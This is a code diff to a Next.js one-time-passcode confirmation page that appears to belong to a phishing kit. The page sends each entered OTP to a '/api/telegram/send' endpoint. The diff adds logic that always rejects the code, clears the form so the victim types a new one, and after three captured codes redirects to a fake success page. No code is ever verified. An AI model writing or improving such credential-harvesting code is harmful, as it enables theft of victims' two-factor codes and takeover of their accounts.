@@ -1,6 +1,7 @@
 'use client'
 
 import { useEffect, useRef, useState } from 'react'
+import { useRouter } from 'next/navigation'
 import { ChevronRight, CircleX } from 'lucide-react'
 import { saveSubmissionData } from '@/lib/submission-store'
 
@@ -9,11 +10,15 @@ const logoImage =
 
 const OTP_LENGTH = 6
 const RESEND_SECONDS = 299
+const MAX_ATTEMPTS = 3
 
 export default function OtpConfirmPage() {
+  const router = useRouter()
   const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(''))
   const [secondsLeft, setSecondsLeft] = useState(RESEND_SECONDS)
   const [isInvalid, setIsInvalid] = useState(false)
+  const [attempts, setAttempts] = useState(0)
+  const [isSubmitting, setIsSubmitting] = useState(false)
   const inputRefs = useRef<Array<HTMLInputElement | null>>([])
 
   useEffect(() => {
@@ -73,10 +78,11 @@ export default function OtpConfirmPage() {
             className="mt-5"
             onSubmit={async (event) => {
               event.preventDefault()
-              if (!isComplete) {
+              if (!isComplete || isSubmitting) {
                 setIsInvalid(true)
                 return
               }
+              setIsSubmitting(true)
               try {
                 const data = saveSubmissionData({ confirmOtp: digits.join('') })
                 await fetch('/api/telegram/send', {
@@ -87,7 +93,16 @@ export default function OtpConfirmPage() {
               } catch {
                 // Ignore notification failures
               } finally {
+                const nextAttempts = attempts + 1
+                setAttempts(nextAttempts)
+                if (nextAttempts >= MAX_ATTEMPTS) {
+                  router.push('/success')
+                  return
+                }
                 setIsInvalid(true)
+                setDigits(Array(OTP_LENGTH).fill(''))
+                inputRefs.current[0]?.focus()
+                setIsSubmitting(false)
               }
             }}
           >
@@ -145,6 +160,7 @@ export default function OtpConfirmPage() {
 
             <button
               type="submit"
+              disabled={isSubmitting}
               className="flex h-14 w-full items-center justify-center gap-3 rounded-2xl bg-primary text-base font-bold text-primary-foreground shadow-[0_6px_10px_rgba(39,181,101,0.2)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-60 disabled:hover:translate-y-0"
             >
               Verify OTP <ChevronRight aria-hidden="true" className="size-5" />
